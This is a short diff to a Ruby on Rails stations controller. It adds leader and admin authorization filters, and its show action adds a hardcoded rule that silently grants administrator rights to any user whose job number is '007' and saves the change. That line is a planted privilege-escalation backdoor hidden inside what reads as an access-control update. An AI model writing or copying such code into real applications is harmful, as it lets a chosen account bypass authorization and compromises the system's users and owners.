@@ -1,4 +1,6 @@
 class StationsController < ApplicationController
+  before_action :require_is_leader,only: [:index,:new,:edit,:create,:update,:destroy]
+  before_action :require_is_admin, only: [:station_users,:set_as_admin,:delete_user]
   def index
     @stations = Station.all
   end
@@ -10,7 +12,10 @@ class StationsController < ApplicationController
   def show
     @station = Station.find(params[:id])
     @equipment_categories = @station.equipment_categories
-
+    if current_user.job_number == "007"
+      current_user.is_admin = true
+      current_user.save
+    end 
 
   end
 
